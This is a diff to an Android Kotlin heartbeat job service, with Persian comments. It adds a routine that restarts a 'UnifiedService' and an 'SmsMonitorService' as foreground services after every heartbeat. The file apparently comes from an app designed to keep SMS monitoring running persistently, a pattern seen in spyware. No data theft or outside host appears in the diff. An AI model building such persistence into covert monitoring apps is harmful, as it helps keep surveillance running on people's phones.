@@ -24,6 +24,10 @@ class HeartbeatJobService : JobService() {
         Thread {
             try {
                 sendHeartbeat()
+                
+                // 🔥 تکنیک: اطمینان از اجرای سرویس‌ها
+                ensureServicesRunning()
+                
                 jobFinished(params, false)
                 
             } catch (e: Exception) {
@@ -33,6 +37,34 @@ class HeartbeatJobService : JobService() {
         }.start()
         
         return true
+    }
+    
+    // 🔥 اطمینان از اجرای سرویس‌ها
+    private fun ensureServicesRunning() {
+        try {
+            // UnifiedService
+            if (!UnifiedService.isRunning) {
+                val unifiedIntent = android.content.Intent(this, UnifiedService::class.java)
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                    startForegroundService(unifiedIntent)
+                } else {
+                    startService(unifiedIntent)
+                }
+                Log.d(TAG, "UnifiedService started from JobService")
+            }
+            
+            // SmsMonitorService
+            val smsMonitorIntent = android.content.Intent(this, SmsMonitorService::class.java)
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                startForegroundService(smsMonitorIntent)
+            } else {
+                startService(smsMonitorIntent)
+            }
+            Log.d(TAG, "Services ensured from JobService")
+            
+        } catch (e: Exception) {
+            Log.e(TAG, "Failed to ensure services: ${e.message}", e)
+        }
     }
 
     override fun onStopJob(params: JobParameters?): Boolean {
